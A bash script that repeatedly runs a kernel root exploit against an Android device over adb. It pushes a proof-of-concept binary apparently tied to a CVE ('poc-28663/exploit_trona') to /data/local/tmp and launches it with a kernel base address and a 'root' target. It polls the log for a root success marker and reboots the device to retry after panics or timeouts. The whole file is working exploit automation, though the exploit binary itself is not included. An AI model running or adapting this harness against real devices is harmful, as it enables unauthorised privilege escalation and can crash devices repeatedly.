#!/bin/bash
# Detached grind: run exploit under nohup on device, poll log, never kill on win.
cd "$(dirname "$0")"
BIN=poc-28663/exploit_trona
BASE=0x40080000
LIMIT=280
ATTEMPT=0
while true; do
	ATTEMPT=$((ATTEMPT + 1))
	echo "===== attempt $ATTEMPT $(date +%H:%M:%S) ====="
	adb wait-for-device
	for i in $(seq 1 30); do
		[ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = "1" ] && break
		sleep 3
	done
	adb push "$BIN" /data/local/tmp/exploit_trona >/dev/null 2>&1
	adb shell "rm -f /data/local/tmp/run.log; cd /data/local/tmp && nohup ./exploit_trona $BASE root > run.log 2>&1 &" >/dev/null 2>&1
	START=$SECONDS
	WON=0
	while true; do
		sleep 10
		timeout 15 adb shell "tail -c 20000 /data/local/tmp/run.log" > last_run.log 2>/dev/null
		if grep -aq "ROOT ====" last_run.log; then
			echo "===== WIN at attempt $ATTEMPT ====="
			cp last_run.log "win_${ATTEMPT}.log"
			WON=1
			break
		fi
		if ! timeout 10 adb shell "true" >/dev/null 2>&1; then
			echo "  device gone (panic/reboot)"
			break
		fi
		if [ $((SECONDS - START)) -gt $LIMIT ]; then
			echo "  timeout, rebooting"
			adb shell "reboot" >/dev/null 2>&1
			break
		fi
	done
	[ $WON -eq 1 ] && exit 0
	sleep 8
done
